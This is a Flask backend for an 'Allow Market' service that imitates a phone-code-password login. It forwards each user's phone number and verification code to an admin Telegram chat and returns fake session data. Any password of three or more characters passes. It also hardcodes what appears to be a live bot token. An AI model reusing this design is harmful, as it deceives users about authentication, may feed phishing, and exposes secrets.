# app.py — для деплоя на Render
from flask import Flask, request, jsonify
from flask_cors import CORS
import random
import time
import requests

app = Flask(__name__)
CORS(app)

# Хранилище кодов
code_store = {}

# Конфиг
ADMIN_BOT_TOKEN = '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec'
ADMIN_CHAT_ID = '7303763255'

def send_admin_log(message, data=None):
    try:
        text = f"🔐 {message}"
        if data:
            text += f"\n{data}"
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except:
        pass

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'service': 'Allow Market Backend (Python/Flask)',
        'version': '1.0.0',
        'endpoints': [
            'GET /ping',
            'POST /sendCode',
            'POST /checkCode',
            'POST /checkPassword'
        ]
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone number'}), 400
    
    code = f"{random.randint(100000, 999999)}"
    request_id = f"req_{int(time.time())}_{random.randint(1000, 9999)}"
    
    code_store[request_id] = {
        'phone': phone,
        'code': code,
        'created_at': time.time(),
        'attempts': 0
    }
    
    # Автоочистка через 5 минут
    def clean():
        if request_id in code_store:
            del code_store[request_id]
    import threading
    threading.Timer(300, clean).start()
    
    # Отправка админу
    send_admin_log(f"📱 Код для {phone}: *{code}*", f"Request ID: `{request_id}`")
    
    return jsonify({
        'success': True,
        'requestId': request_id,
        'message': 'Code sent successfully'
    })

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    request_id = data.get('requestId', '').strip()
    
    if not phone or not code or not request_id:
        return jsonify({'success': False, 'error': 'Missing required fields'}), 400
    
    stored = code_store.get(request_id)
    
    if not stored:
        return jsonify({'success': False, 'error': 'Code expired'}), 400
    
    if stored['phone'] != phone:
        return jsonify({'success': False, 'error': 'Phone mismatch'}), 400
    
    stored['attempts'] += 1
    
    if stored['attempts'] > 5:
        del code_store[request_id]
        return jsonify({'success': False, 'error': 'Too many attempts'}), 400
    
    if stored['code'] != code:
        remaining = 5 - stored['attempts']
        return jsonify({'success': False, 'error': f'Invalid code. {remaining} attempts left'}), 400
    
    del code_store[request_id]
    
    has_password = random.random() < 0.2
    
    session_data = {
        'user_id': random.randint(100000, 9999999),
        'phone': phone,
        'username': f"user_{random.randint(10000, 99999)}",
        'session_string': f"session_{int(time.time())}_{random.randint(1000, 9999)}"
    }
    
    return jsonify({
        'success': True,
        'hasPassword': has_password,
        'sessionData': session_data,
        'message': 'Code verified successfully'
    })

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    password = data.get('password', '').strip()
    
    if not password:
        return jsonify({'success': False, 'error': 'Password required'}), 400
    
    is_valid = len(password) >= 3
    
    return jsonify({
        'success': is_valid,
        'message': 'Password verified' if is_valid else 'Invalid password'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
